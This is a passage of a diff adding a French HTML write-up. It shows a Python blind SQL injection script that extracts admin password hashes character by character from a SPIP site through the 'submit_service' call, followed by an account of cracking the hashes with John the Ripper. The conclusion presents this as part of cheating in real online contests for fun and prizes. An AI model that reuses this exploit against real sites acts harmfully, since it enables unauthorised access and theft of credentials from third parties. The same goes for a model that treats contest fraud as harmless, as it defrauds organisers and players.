+        c = 'e'
+      else:
+        c = 'f'
+    else:
+      # a, b, c, d
+      if submit_service(&quot;0&quot;, '&quot; OR login=&quot;test&quot; AND ascii(substr(pass,%s,1))&gt;98 AND statut!=&quot;0minirezo' % (pos), '', 404, 'xxx') == &quot;encryption error&quot;:
+        # c ou d
+        if submit_service(&quot;0&quot;, '&quot; OR login=&quot;test&quot; AND ascii(substr(pass,%s,1))=99 AND statut!=&quot;0minirezo' % (pos), '', 404, 'xxx') == &quot;encryption error&quot;:
+          c = 'c'
+        else:
+          c = 'd'
+      else:
+        # a ou b
+        if submit_service(&quot;0&quot;, '&quot; OR login=&quot;test&quot; AND ascii(substr(pass,%s,1))=97 AND statut!=&quot;0minirezo' % (pos), '', 404, 'xxx') == &quot;encryption error&quot;:
+          c = 'a'
+        else:
+          c = 'b'
+  else:
+    # loginbres
+    if submit_service(&quot;0&quot;, '&quot; OR login=&quot;test&quot; AND ascii(substr(pass,%s,1))&gt;52 AND statut!=&quot;0minirezo' % (pos), '', 404, 'xxx') == &quot;encryption error&quot;:
+      # 5..9
+      if submit_service(&quot;0&quot;, '&quot; OR login=&quot;test&quot; AND ascii(substr(pass,%s,1))&gt;54 AND statut!=&quot;0minirezo' % (pos), '', 404, 'xxx') == &quot;encryption error&quot;:
+        # 7..9
+        if submit_service(&quot;0&quot;, '&quot; OR login=&quot;test&quot; AND ascii(substr(pass,%s,1))&gt;55 AND statut!=&quot;0minirezo' % (pos), '', 404, 'xxx') == &quot;encryption error&quot;:
+          # 8 ou 9
+          if submit_service(&quot;0&quot;, '&quot; OR login=&quot;test&quot; AND ascii(substr(pass,%s,1))=56 AND statut!=&quot;0minirezo' % (pos), '', 404, 'xxx') == &quot;encryption error&quot;:
+            c = '8'
+          else:
+            c = '9'
+        else:
+          c = '7'
+      else:
+        # 5 ou 6
+        if submit_service(&quot;0&quot;, '&quot; OR login=&quot;test&quot; AND ascii(substr(pass,%s,1))=53 AND statut!=&quot;0minirezo' % (pos), '', 404, 'xxx') == &quot;encryption error&quot;:
+          c = '5'
+        else:
+          c = '6'
+    else:
+      # 0..4
+      if submit_service(&quot;0&quot;, '&quot; OR login=&quot;test&quot; AND ascii(substr(pass,%s,1))&gt;50 AND statut!=&quot;0minirezo' % (pos), '', 404, 'xxx') == &quot;encryption error&quot;:
+        # 3 ou 4
+        if submit_service(&quot;0&quot;, '&quot; OR login=&quot;test&quot; AND ascii(substr(pass,%s,1))=51 AND statut!=&quot;0minirezo' % (pos), '', 404, 'xxx') == &quot;encryption error&quot;:
+          c = '3'
+        else:
+          c = '4'
+      else:
+        if submit_service(&quot;0&quot;, '&quot; OR login=&quot;test&quot; AND ascii(substr(pass,%s,1))&gt;48 AND statut!=&quot;0minirezo' % (pos), '', 404, 'xxx') == &quot;encryption error&quot;:
+          # 1 ou 2
+          if submit_service(&quot;0&quot;, '&quot; OR login=&quot;test&quot; AND ascii(substr(pass,%s,1))=49 AND statut!=&quot;0minirezo' % (pos), '', 404, 'xxx') == &quot;encryption error&quot;:
+            c = '1'
+          else:
+            c = '2'
+        else:
+          c = '0'
+
+  hash += c
+  print hash</pre>
+
+  <p>On obtient finalement 5 logins admin avec leurs hash associés. Il faut aussi récupérer le salt qui est le <em>alea_actuel</em> dans la base de données.<br />
+On met ça dans un fichier texte de cette forme :<br />
+login:md5_gen(4)hash_password$alea_actuel<br />
+Et on balance à JTR (Jumbo). Mais après l'équivalent de plus de 90 jours à tourner (oui on est des bourrins :p) nous n'avons toujours rien obtenu. Idem avec des dicos énormes.</p>
+
+<p><u>Résultat</u></p>
+<p>Soit on a merdé quelque part, soit le système de chiffrement de SPIP est vraiment efficace et force à utiliser des passwords forts, soit JTR ne gère pas bien les données (longueur du salt) qu'on lui donne...<br />
+Dans tous les cas on a préféré laisser tomber :p</p>
+
+<h1>Conclusion</h1>
+
+<p>On s'apperçoit vite que quand on triche, nos seuls vrais concurrents sont les autres tricheurs :p C'est intéressant de se mesurer à eux, malheureusement beaucoup de ce que l'on a croisé ne sont pas discrets et provoquent la suspiçion des organisateurs qui ne se sont visiblement pas préparés à de telles situations. Du coup certains annulent le coucours en lousdé, virent des comptes de joueurs sans prévenir ou se donnent quelques libertés quand aux lots et aux vainqueurs. <a href="http://d4n3ws.polux-hosting.com/2011/10/14/france-cas-descroquerie-avec-des-jeux-en-ligne/">C'est déjà arrivé</a> que les concours soient pipés.<br />
+Mais on s'en fout, ce ne sont que des jeux et on triche d'abord pour le fun et seulement ensuite pour les lots.</p>
+  </body>
+</html>
